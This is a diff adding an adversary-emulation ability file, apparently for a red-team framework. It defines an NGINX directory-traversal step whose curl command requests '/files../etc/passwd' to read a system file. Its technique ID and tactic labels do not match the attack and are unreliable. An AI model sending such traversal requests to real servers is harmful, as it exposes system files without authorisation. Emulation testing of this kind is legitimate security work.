@@ -1,0 +1,41 @@
+- tactic: execution
+  technique_name: NGINX Directory Traversal Vulnerability
+  technique_id: T1001.002
+  name: NGINX Directory Traversal Vulnerability
+  description: https://github.com/vulhub/vulhub/blob/master/nginx/insecure-configuration/README.md
+  executors:
+  - name: sh
+    platform: linux
+    command: curl http://localhost:#{host.port.8081}/files../etc/passwd;
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 5
+    parsers:
+    - module: plugins.stockpile.app.parsers.directory_traversal
+      parserconfigs:
+      - source: host.files
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements:
+  - module: plugins.stockpile.app.requirements.paw_provenance
+    relationship_match:
+    - source: host.port.8081
+      edge: ''
+      target: ''
+  privilege: ''
+  repeatable: false
+  buckets:
+  - execution
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: true
+  id: directory-traversal
